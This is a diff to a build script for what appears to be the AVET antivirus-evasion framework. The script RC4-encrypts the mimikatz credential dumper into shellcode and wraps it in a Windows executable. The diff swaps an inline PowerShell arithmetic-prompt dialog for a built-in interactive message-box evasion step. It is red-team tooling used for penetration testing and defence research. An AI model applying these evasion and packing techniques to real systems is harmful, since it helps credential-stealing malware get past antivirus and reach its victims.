@@ -29,9 +29,12 @@ enable_debug_print
 generate_key preset aabbccdd1122 input/key_raw.txt
 #CONFIGURATION_END
 
+
+set_command_source no_data
+set_command_exec no_command
+
 # powershell open MessageBox with text field and ok button
-set_command_source static_from_here 'Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing;$window = New-Object System.Windows.Forms.Form;$window.Width = 500;$window.Height = 150;$Label = New-Object System.Windows.Forms.Label;$Label.Location = New-Object System.Drawing.Size(10,10);$Label.Text = '"'"'Rechne aus: 5+5'"'"';$Label.AutoSize = $True;$window.Controls.Add($Label);$windowButton = New-Object System.Windows.Forms.Button;$windowButton.Location = New-Object System.Drawing.Size(10,60);$windowButton.Size = New-Object System.Drawing.Size(50,30);$windowButton.Text = '"'"'OK'"'"';$windowButton.Enabled = $false;$windowTextBox = New-Object System.Windows.Forms.TextBox;$windowTextBox.Location = New-Object System.Drawing.Size(10,30);$windowTextBox.Size = New-Object System.Drawing.Size(350,350);$windowTextBox.add_TextChanged({$windowButton.Enabled = $windowTextBox.Text});$window.Controls.Add($windowTextBox);$windowButton.Add_Click({$calc = [int]$windowTextBox.Text;if($calc -eq 10) {$r = 0;}else {$r = -1;}$window.Dispose();});$window.Controls.Add($windowButton);[void]$window.ShowDialog(); return $r;'
-set_command_exec exec_via_powershell
+add_evasion interactive_msg_box
 
 # convert mimikatz executable into shellcode format
 # Can be of course used with other .exe files
@@ -61,7 +64,7 @@ set_payload_execution_method exec_shellcode64
 
 # compile to exe file
 $win64_compiler -o output/rc4_interactive_with_arithmetic_pwsh_mimikatz_win64.exe source/avet.c
-strip output/rc4enc_mimikatz_win64.exe
+strip output/rc4_interactive_with_arithmetic_pwsh_mimikatz_win64.exe
 
 # cleanup
 cleanup_techniques
